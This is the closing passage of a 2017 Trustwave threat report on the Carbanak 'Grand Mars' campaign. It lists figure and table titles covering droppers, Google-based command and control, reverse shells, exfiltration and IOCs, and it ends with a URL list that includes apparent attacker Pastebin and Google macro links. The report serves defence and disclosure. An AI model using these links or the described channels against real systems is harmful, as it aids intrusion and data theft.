.  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 4\n\nFigure 6 . oleObject .bin showing potentially encoded content  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 5\n\nFigure 7 . Use of legitimate tool to encrypt/encode VBE script .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 5\n\nFigure 8 . Tool used for obfuscating the VBE script .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 6\n\nFigure 9 . Binary to String conversion functions  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 7\n\nFigure 10 . Base64 encode-decode functions .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 7\n\nFigure 11 . Starter .vbs creation (truncated)  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 8\n\nFigure 12 . LanCradDriver .vbs LanCradDriver .ini creation  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 8\n\nFigure 13 . TransbaseOdbcDrive .js creation (truncated)  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 9\n\nFigure 14 . Persistence of starter .vbs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 9\n\nFigure 15 . Calculating and encoding of Disk S/N .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 10\n\nFigure 16 . Checking proxy configuration  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 10\n\nFigure 17 . Main function  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 10\n\nFigure 18 . sendFormData function .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 11\n\nFigure 19 . Initial submission Google Form  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 12\n\nFigure 20 . Files dropped on execution of embedded VBE script  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 13\n\nFigure 21 . Starter .vbs script  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 13\n\nFigure 22 . Process information for TransbaseOdbcDriver .js  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 14\n\nFigure 23 . LoadLinkSettings() function .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 14\n\nFigure 24 . Google macro execution output  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 15\n\nFigure 25 . LogInet() function  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 15\n\nFigure 26 . Infected system registration using Google Form  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 15\n\nFigure 27 . Calling GetSourceCode() function  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 16\n\nFigure 28 . GetSourceCode function .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 16\n\nFigure 29 . Code from Pastebin  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 16\n\nFigure 30 . Arguments from Pastebin  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 17\n\nFigure 31 . Pastebin account used for tracking .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 17\n\nFigure 32 . Downloading code from Google Docs (truncated)   .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 18\n\nFigure 33 . Encoded PowerShell commands retrieved from Google Spreadsheet  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 18\n\nFigure 34 . LaCradDriver .ini (truncated) .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 19\n\nFigure 35 . LanbCradDriver .vbs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 19\n\nFigure 36 . LanCradDriver .ini (truncated)  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 20\n\nFigure 37 . LanCradDriver .ini populated post-execution of TransbaseOdbcDriver .js  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 20\n\nFigure 38 . Role of dropped files and sequence of execution  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 20\n\nFigure 39 . Activity diagram showing C&C involving Google Forms and Docs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 21\n\nFigure 40 . Activity diagram showing C&C in case Google Spreadsheet not available  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 22\n\nFigure 41 . TCP Reverse Shell from a PowerShell script  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 23\n\n41\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fFigure 42 . Registry persistence  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 24\n\nFigure 43 . SysCheks Scheduled Task persistence  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 24\n\nFigure 44 . Event showing Pass-the-Hash indicators  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 25\n\nFigure 45 . Batch file used for spreading  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 26\n\nFigure 46 . PowerShell script used for spreading  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 26\n\nFigure 47 . HTTP POST request used to exfiltrate data from compromised system  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 28\n\nFigure 48 . HTTP POST method options  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 29\n\nFigure 49 . XOR key detection  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 30\n\nFigure 50 . Payload decoding  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 30\n\nFigure 51 . Starting Anunak after decrypting it   .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 30\n\nFigure 52 . Procdot visualization of UVZHDVIZ .exe .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 30\n\nFigure 53 . Digital certificate details of UVZHDVIZ .exe (Grand Mars) .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 31\n\nFigure 54 . Digital certificate details of update .exe .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 32\n\nFigure 55 . Decryption routine with XOR key  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 32\n\nFigure 56 . Loader Code .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 33\n\nFigure 57 . PE Executable  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 33\n\nFigure 58 . Memory allocation for payload  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 33\n\nFigure 59: Routine to decrypt beacon DLL  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 33\n\nFigure 60 . Decrypted beacon DLL  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 33\n\nFigure 61 . Reflective beacon DLL  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 34\n\nFigure 62 . EICAR test string in X-Malware field  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 34\n\nFigure 63 . Malicious hosts geolocation .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 36\n\nFigure 64 . Shtokov Pastebin site used in Command and Control  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 37\n\nList of Tables\n\nTable 1 . Hashes of Starter .vbs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 13\n\nTable 2 . Hashes of TransbaseOdbcDriver .js  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 14\n\nTable 3 . Hashes of LanCradDriver .vbs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 19\n\nTable 4 . Hashes of LanCradDriver .ini  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 19\n\nTable 5 . Hashes of AdobeUpdateManagementTool .vbs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 27\n\nTable 6 . Examples of supported commands  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 28\n\nTable 7 . Hashes of UVZHDVlZ .exe  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 29\n\nTable 8 . Hashes of Update .exe  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 31\n\nTable 9 . Hashes of 322 .exe .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 34\n\nTable 10 . Valid {transport} command line options for 322 .exe  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 35\n\nTable 11 . File IOCs for the Grand Mars APT   .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 39\n\nTable 12 . Malicious hosts and IPs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 40\n\n42\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\ftrustwave.com\n\nCopyright \u00a9 2017 Trustwave Holdings, Inc.\n\nGMAPTO_0116\n\n\f"], "URLs": ["https://script.google.com/macros/s/AKfycbyHCvQKeEwmgQqB661-", "http://www.procdot.com/", "http://pastebin.com/raw/MfQV5e6R", "https://docs.google.com/spreadsheet/ccc?key=", "http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf", "https://www.metasploit.com/", "https://github.com/PowerShellMafia/PowerSploit", "https://www.veil-framework.com/", "https://msdn.microsoft.com/en-us/library/office/cc313118(v=office.12).aspx", "http://www.dennisbabkin.com/screnc/", "https://docs.google.com/forms/d/"], "weight": 0.0}